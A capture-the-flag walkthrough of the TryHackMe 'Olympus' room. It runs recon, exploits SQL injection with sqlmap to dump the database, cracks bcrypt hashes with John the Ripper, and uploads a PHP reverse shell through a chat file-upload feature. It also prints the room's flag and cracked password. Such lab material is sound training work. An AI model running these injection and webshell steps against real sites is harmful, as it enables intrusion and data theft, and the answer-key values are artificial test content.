📚 [TryHackMe Olympus](https://tryhackme.com/room/olympusroom)

> Bruteforcing against any login page is out of scope and should not be used


## recon

[nmap scan (zznmap)](https://github.com/TurboLabIt/cybersec/blob/main/notes/nmap.md)

````shell
$ zznmap 10.64.180.238

Discovered open port 80/tcp on 10.64.180.238
Discovered open port 22/tcp on 10.64.180.238

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b1:b7:34:69:93:1f:d9:9c:32:0f:7a:4e:a6:e6:08:f8 (RSA)
|   256 d9:f9:c0:85:62:53:3e:a1:30:09:8b:26:c4:3a:41:66 (ECDSA)
|_  256 e8:80:39:a1:d8:73:a6:09:3f:b4:d3:a6:c6:af:dd:83 (ED25519)

80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://olympus.thm
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
````

- **22**: OpenSSH 8.2p1
- **80**: Apache httpd 2.4.41


[olympus.thm](http://olympus.thm)


## webapp recon

````shell
$ sudo nano /etc/hosts

10.65.170.200 olympus.thm
````


````shell
$ curl -i http://olympus.thm

...

<!DOCTYPE html>
...
  <meta name="Keywords" content="AperiSolve, Apérisolve, Aperi'Solve, Apéri'Solve, Zeecka">
  <meta name="Author" content="Zeecka">
...
  <div id="notimage" class="hidden">If support is needed, please contact root@the-it-department. The old version of the website is still accessible on this domain.</div>
...
<script>particlesJS.load('particles-js', 'http://olympus.thm/static/particles.json', function () { });</script>
````

**The old version of the website is still accessible on this domain.**


````shell
$ zzgobuster

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

==> DIRECTORY: http://olympus.thm/~webmaster/
==> DIRECTORY: http://olympus.thm/javascript/
+ http://olympus.thm/phpmyadmin (CODE:403|SIZE:276)
+ http://olympus.thm/server-status (CODE:403|SIZE:276)
==> DIRECTORY: http://olympus.thm/static/

...

Starting gobuster in directory enumeration mode
===============================================================
static               (Status: 301) [Size: 311] [--> http://olympus.thm/static/]
javascript           (Status: 301) [Size: 315] [--> http://olympus.thm/javascript/]
phpmyadmin           (Status: 403) [Size: 276]
server-status        (Status: 403) [Size: 276]
Progress: 207641 / 207641 (100.00%)
````


## ~webmaster recon

**[olympus.thm/~webmaster](http://olympus.thm/~webmaster/)**

> I found out that some of you (not everyone thankfully) use really common passwords

````shell
$ curl -s http://olympus.thm/~webmaster/ | grep '.php'
````

Working:

- search.php
- includes/login.php
- category.php

Not working (404):

- register.php
- post.php?post=2


## search.php

````html
<form method="POST" action="search.php">
  <input name="search" type="text" class="form-control">
 <button name="submit" class="btn btn-default" type="submit">
</form>
````

Test inject:

````
$ curl 'http://olympus.thm/~webmaster/search.php' \
  --compressed \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' \
  --data-raw "search=bao'&submit="

Query FailYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%' AND post_status='publish'' at line 1 
````

Preparare the request (via browser):

````
POST /~webmaster/search.php HTTP/1.1
Host: olympus.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 19
Origin: http://olympus.thm
Connection: keep-alive
Referer: http://olympus.thm/~webmaster/
Cookie: PHPSESSID=4unbbm4p9meqa65tcosdk5n4e4
Upgrade-Insecure-Requests: 1
Priority: u=0, i

search=test*&submit
````

Show databases:

````shell
$ sqlmap -r search.php-request.txt --dbs

[*] information_schema
[*] mysql
[*] olympus
[*] performance_schema
[*] phpmyadmin
[*] sys
````

Show tables:

````shell
$ sqlmap -r search.php-request.txt -D olympus --tables

+------------+
| categories |
| chats      |
| comments   |
| flag       |
| posts      |
| users      |
+------------+
````

Dump:

````shell
sqlmap -r search.php-request.txt -D olympus --dump-all
````

There's a table named `flag`, with the first flag: `flag{Sm4rt!_k33P_d1gGIng}`.


## crack the users

Format the users table like this for John The Ripper:

````
prometheus:$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C
root:$2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK
zeus:$2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC
````

Then run John The Ripper on it:

````
$ john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt users-hashes.txt
summertime       (prometheus)
````


## ssh

`ssh prometheus@olympus.thm` doesn't work (wrong password).


## admin

Use the credentials to login on the website.

After logging in, you get http://olympus.thm/~webmaster/admin/ . It's a CRUD on the database.

The database contains a `chat` table, not visibile here. Plus: the email addresses are `zeus@chat.olympus.thm`.


## chat.olympus.thm

````shell
$ sudo nano /etc/hosts

10.65.170.200 olympus.thm chat.olympus.thm
````

http://chat.olympus.thm . Login with `prometheus` / `summertime` (found above).

The user can upload a file from here. The chat mentions:

> Attached : prometheus_password.txt
> I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back
> The IT guy used a random file name function to make it harder for attackers to access the uploaded files

So: the folder is easy to guess: `/uploads`. But it's just a blank page, not an index.

From the dumped `chats` table, we know the existing filename is:

````
2022-04-05,Attached : prometheus_password.txt,prometheus,47c3210d51761686f3af40a875eeaaea.txt
````

This didn't work:

````shell
$ hash-identifier '47c3210d51761686f3af40a875eeaaea'
$ echo "47c3210d51761686f3af40a875eeaaea" > hashed-filename.txt
$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashed-filename.txt

$ echo 'prometheus' | md5sum
e78bd74e8af5ef479fe1322deb54e3f9
````


## upload the webshell

Let's try to:

1. upload a `info.php` file
2. read the assigned name from the chats table
3. open it via browser

````shell
$ sqlmap -r search.php-request.txt -D olympus -T chats --dump

| 2026-01-18 | Attached : info.php| prometheus | 5f6dc32c53bff712a6c470a0c231b5e0.php |
````

It worked. Let's go with [notes/webshell.md](https://github.com/TurboLabIt/cybersec/blob/main/notes/webshell.md).

It worked:

````
| 2026-01-18 | Attached : php-reverse-shell.php| prometheus | 1f21f194db6fe839fd131f4397d0a226.php |
````

http://chat.olympus.thm/uploads/1f21f194db6fe839fd131f4397d0a226.php


## work with the shell

Go with [notes/suid-exploit.md](https://github.com/TurboLabIt/cybersec/blob/main/notes/suid-exploit.md).

...TO BE CONTINUED...
